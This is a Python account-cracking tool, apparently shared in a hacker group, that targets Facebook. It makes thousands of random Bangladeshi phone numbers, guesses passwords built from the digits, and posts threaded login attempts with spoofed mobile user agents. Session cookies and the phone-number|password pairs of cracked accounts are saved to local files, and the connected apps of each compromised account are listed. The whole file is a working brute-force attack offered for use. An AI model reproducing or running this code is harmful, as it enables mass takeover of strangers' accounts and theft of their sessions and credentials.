#SCRIPT WRITTEN BY 👑 NAFIJ 👑
#GITHUB : TBH-NAFIJ

#--------------------------------- IMPORT ---------------------------------#
import os
import sys
import time
import requests
import uuid
import getpass
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
import datetime
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4')
    os.system('pip install bs4')
#--------------------------------- ETC ---------------------------------#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
RED = '\033[1;31m'
wx = '\033[1;37m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
pink = '\033[1;35m'
G3 = '\x1b[38;5;48m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
dtn = str(tgl)+'-'+str(bln)+'-'+str(thn)
#--------------------------------- LOGIN ---------------------------------#
def linex():
    print(f'\r\033[1;92m  ═══════════════════════════════════════════════════')
    
try:
   import rich
except:
   os.system("pip install rich")
   import rich
from rich.progress import track
os.system('clear')
def loading(NAFIJ):
    for i in track(range(500),description=NAFIJ):
        time.sleep(0.01)
loading("\033[1;35m\033[1;33m★★\033[1;32mLOADING...\033[1;36m★★")
  
attemps = 0
while attemps < 12345677901:
    username = input('\033[1;32mENTER USERNAME : ')
    password = input('\033[1;36mENTER PASSWORD : ')
    
    if username == 'TBH' and password == 'NAFIJ':
        print(' \033[0;92mSUCCES YOUR LOGING.')
        break
    else:
        print(' INCORRECT PASSWORD TRY AGAIN')      
        attemps += 1     
        continue
os.system('xdg-open https://t.me/TBHHACKER')       
os.system('espeak -a 300 "TBH HACKER TEAM IS BRAND TEAM"')
os.system('xdg-open https://t.me/TBHHACKER')         
os.system('clear')
#--------------------------------- APP CHECKER ---------------------------------#
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[•] %s \x1b[1;95m Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[•] %s \x1b[1;95m Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Expired"," Expired"),N))
        else:
            print('')
            
#--------------------------------- LOOP AND USER AGENT ---------------------------------#
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]

for xd in range(1):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(5000,7000)
    k=random.randrange(100,200)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
#--------------------------------- LOGO ---------------------------------#

logo =f"""
┏━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
▗▄▄▄▖▗▄▄▖ ▗▖ ▗▖    ▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▖ ▗▖▗▄▄▄▖▗▄▄▖     ▗▄▄▄▖▗▄▄▄▖ ▗▄▖ ▗▖  ▗▖
  █  ▐▌ ▐▌▐▌ ▐▌    ▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘▐▌   ▐▌ ▐▌      █  ▐▌   ▐▌ ▐▌▐▛▚▞▜▌
  █  ▐▛▀▚▖▐▛▀▜▌    ▐▛▀▜▌▐▛▀▜▌▐▌   ▐▛▚▖ ▐▛▀▀▘▐▛▀▚▖      █  ▐▛▀▀▘▐▛▀▜▌▐▌  ▐▌
  █  ▐▙▄▞▘▐▌ ▐▌    ▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▐▌ ▐▌      █  ▐▙▄▄▖▐▌ ▐▌▐▌  ▐▌
┗━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                                                                                                                                                                                                                   
{A}\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★
┏━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ \033[1;32m ┃OWNER   \033[1;92m ➤\033[1;32m TBH NAFIJ
┃ \033[1;32m ┃FACEBOOK\033[1;92m ➤\033[1;32m NAFIJ SHEIKH 
┃\033[1;33m  ┃TOOLTYPE\033[1;92m ➤\033[1;33m RANDOM CLONING
┃ \033[1;33m ┃STATUS \033[1;92m  ➤\033[1;33m GIFT
┃ \033[1;36m ┃ENJOY \033[1;92m   ➤\033[1;36m ALL MEMBER
┃ \033[1;36m ┃VERSON\033[1;92m   ➤\033[1;36m 2.0
┗━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ 
{A}\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★\033[1;32m★\033[1;33m★\033[1;34m★\033[1;31m★\033[1;91m★\033[1;35m★\033[1;36m★"""                                                                                                                                                                                                            
#--------------------------------- MAIN ---------------------------------#
def love_NAFIJ():
    os.system('clear')
    print(logo)
    linex()
    print('\033[1;92m[\033[1;91m1\033[1;92m]\033[1;95m START RANDOM CRACK ')
    print('\033[1;92m[\033[1;91m2\033[1;92m]\033[1;95m CONTACT OWNER ')
    print('\033[1;92m[\033[1;91m0\033[1;92m]\033[1;91m EXIT')
    linex()
    NAFIJ = input('\x1b[1;32m CHOOSE : ')
    if NAFIJ == '1':
        nafij()
    if NAFIJ == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=61553652325758&mibextid=ZbWKwL')
        love_NAFIJ()
    else:
        sys.exit("Exit Successfully")
def sanjida():
    user = []
    os.system("clear")
    print(logo)
    linex()
    print('\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
    linex()
    code = input('\033[1;35mCHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    linex()
    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\n\n\033[1;91mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    
    with ThreadPool(max_workers=50) as samira:
        os.system("clear")
        print(logo)
        tl = str(len(user))
        now = datetime.datetime.now()
        rtime = now.strftime("%H:%M:%S")
        print('\033[1;92m[\033[1;91m•\033[1;92m]\033[1;95m SELECTED CODE : \033[1;92m' + code)
        print('\033[1;92m[\033[1;91m•\033[1;92m]\033[1;95m TOTAL IDS : \033[1;92m' + tl)
        print('\033[1;92m[\033[1;91m•\033[1;92m]\033[1;95m STARTING TIME : \033[1;92m' + str(rtime))
        print('\033[1;92m[\033[1;91m•\033[1;92m]\033[1;95m TODAY DATE : \033[1;92m' + str(now.date()))
        print('\033[1;92m[\033[1;91m•\033[1;92m]\033[1;95m THE PROCESS HAS BEEN STARTED')
        linex()
        for psx in user:
            uid = code + psx
            pwx = [psx, psx[5:], uid, uid[4:], uid[5:], uid[:8], uid[:7], uid[:6]]
            samira.submit(shajon_crack, uid, pwx, tl)
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
    print(" OK IDS SAVED IN : NAFIJ-OK.txt")
    print(" CP IDS SAVED IN : NAFIJ-CP.txt")

def shajon_crack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.flush()
            sys.stdout.write('\r%s[NAFIJ] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            "authority": 'm.facebook.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://www.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = str(uid)
                print('\033[1;32m[NAFIJ-OK] ' +cid+ ' | ' +ps+ '\n\033[1;33mCOOKIE : \033[1;33m'+coki +'\033[0;37m')
                cek_apk(session,coki)
                open('NAFIJ-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = str(uid)
                print('\33[1;34m[NAFIJ-CP] ' +cid+ ' | ' +ps+ '  \33[0;97m')
                open('NAFIJ-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except  requests.exceptions.ConnectionError:
            time.sleep(31)        

sanjida()